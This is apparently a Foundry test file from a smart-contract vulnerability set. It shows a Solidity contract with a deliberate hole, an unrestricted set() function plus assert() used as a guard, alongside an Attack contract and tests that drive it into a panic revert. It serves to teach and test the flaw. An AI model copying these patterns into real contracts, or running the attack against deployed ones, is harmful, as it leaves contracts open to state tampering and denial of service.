pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract with Wrong Selection of Guard Function vulnerability
contract AssertMultiTx2 {
    // Vulnerability: state variable parameter can be arbitrarily modified
    uint256 private param;

    // Constructor flaw: ignores the input _param and sets param to 0
    constructor(uint256 _param) {
        param = 0;
    }

    // Function allowing modification of param
    function set(uint256 _param) public {
        param = _param;
    }

    // Vulnerable function using assert to check state
    // If param is not > 0, assert failure consumes all remaining gas
    function run() public {
        assert(param > 0);
    }
}

// Attack contract demonstrating the exploit
contract Attack {
    AssertMultiTx2 public vulnerable;

    // Store the vulnerable contract address
    constructor(address _vulnerableAddress) {
        vulnerable = AssertMultiTx2(_vulnerableAddress);
    }

    // Attack steps:
    // 1. Set param to 0
    // 2. Call run() to trigger assert failure, consuming gas
    function attack() public {
        vulnerable.set(0);
        vulnerable.run();
    }
}

contract VulnerabilityTest is Test {
    AssertMultiTx2 vulnerable;
    Attack attackContract;

    // Helper constant for Panic error selector
    // Panic(uint256) is called with code 0x01 for assert violation
    bytes4 constant PANIC_SELECTOR = bytes4(keccak256("Panic(uint256)"));

    function setUp() public {
        // Deploy the vulnerable contract with a non-zero parameter in constructor
        // Notice that due to vulnerability, param is always set to 0
        vulnerable = new AssertMultiTx2(100);
    }

    // Test that run() reverts (assert failure) when param is 0
    function testRunRevertsWhenParamZero() public {
        // We expect an assert (panic) failure due to assert(param > 0) failing
        vm.expectRevert(abi.encodeWithSelector(PANIC_SELECTOR, 0x01));
        vulnerable.run();
    }

    // Test that if we set param to a non-zero value, run() does NOT revert
    function testRunSucceedsWhenParamNonZero() public {
        vulnerable.set(1);
        // run should succeed now because param > 0
        vulnerable.run();
    }

    // Test the exploit using the Attack contract
    function testAttackExploit() public {
        // Deploy the attack contract 
        attackContract = new Attack(address(vulnerable));

        // First, set a valid non-zero value to confirm functionality
        vulnerable.set(42);
        vulnerable.run();

        // Now, perform the attack: attack contract calls set(0) then run()
        // Expect the attack to revert with the same panic code
        vm.expectRevert(abi.encodeWithSelector(PANIC_SELECTOR, 0x01));
        attackContract.attack();
    }

    // Additional demonstration: direct call to run after manually setting param to 0 via set() function
    function testDirectAttackManualSet() public {
        vulnerable.set(100);
        vulnerable.run(); // should work fine
        // Now manually set param to 0 which is the same as what the attack would do
        vulnerable.set(0);
        vm.expectRevert(abi.encodeWithSelector(PANIC_SELECTOR, 0x01));
        vulnerable.run();
    }
}
